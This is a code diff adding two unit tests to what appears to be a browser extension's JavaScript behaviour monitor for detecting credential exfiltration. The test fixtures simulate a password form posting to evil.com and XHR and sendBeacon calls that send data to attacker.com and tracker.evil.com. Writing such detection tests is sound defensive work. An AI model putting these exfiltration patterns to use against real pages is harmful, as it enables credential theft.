@@ -210,4 +210,65 @@ describe("js behavior monitor: frozen MAIN-world globals do not abort init", () 
       expect.objectContaining({ api: "fetch", destinationOrigin: "https://attacker.com" }),
     );
   });
+
+  it("does not leave _xhrPatched stuck: a re-sync after send becomes writable installs the XHR patch", async () => {
+    window.fetch = vi.fn().mockResolvedValue(new Response()) as unknown as typeof window.fetch;
+    navigator.sendBeacon = vi.fn().mockReturnValue(true) as unknown as typeof navigator.sendBeacon;
+    freeze(XMLHttpRequest.prototype, "send");
+
+    const mod = await freshMonitor();
+    const postSignal = vi.fn<PostSignalFn>();
+
+    // First sync: send is frozen, so open() is rolled back and the patch is not marked done.
+    mod.initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });
+    expect(XMLHttpRequest.prototype.open).toBe(NATIVE_XHR_OPEN);
+
+    // send becomes writable again, then a later ns-config re-sync re-runs init.
+    defineWritable(XMLHttpRequest.prototype, "send", NATIVE_XHR_SEND);
+    mod.initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });
+
+    // The retry must have installed both wrappers: a 3P XHR correlated with a
+    // credential form submit now emits the exfil signal.
+    const form = document.createElement("form");
+    form.action = "https://evil.com/steal";
+    const pw = document.createElement("input");
+    pw.type = "password";
+    form.appendChild(pw);
+    document.body.appendChild(form);
+    form.dispatchEvent(new Event("submit", { bubbles: true }));
+
+    const xhr = new XMLHttpRequest();
+    xhr.open("POST", "https://attacker.com/collect");
+    xhr.send("data");
+
+    expect(postSignal).toHaveBeenCalledWith(
+      "ns-js-exfil-network",
+      expect.objectContaining({ api: "xhr", destinationOrigin: "https://attacker.com" }),
+    );
+  });
+
+  it("does not leave _beaconPatched stuck: a re-sync after sendBeacon becomes writable installs the beacon patch", async () => {
+    window.fetch = vi.fn().mockResolvedValue(new Response()) as unknown as typeof window.fetch;
+    navigator.sendBeacon = vi.fn().mockReturnValue(true) as unknown as typeof navigator.sendBeacon;
+    freeze(navigator, "sendBeacon");
+
+    const mod = await freshMonitor();
+    const postSignal = vi.fn<PostSignalFn>();
+
+    // First sync: sendBeacon is frozen, so the patch is skipped (caught), not marked done.
+    mod.initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });
+
+    // sendBeacon becomes writable again, then a later ns-config re-sync re-runs init.
+    defineWritable(navigator, "sendBeacon", vi.fn().mockReturnValue(true));
+    mod.initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });
+
+    // The retry must have installed the wrapper: a 3P beacon on a credential page emits.
+    credentialForm();
+    navigator.sendBeacon("https://tracker.evil.com/collect", "payload");
+
+    expect(postSignal).toHaveBeenCalledWith(
+      "ns-js-exfil-beacon",
+      expect.objectContaining({ destinationOrigin: "https://tracker.evil.com" }),
+    );
+  });
 });
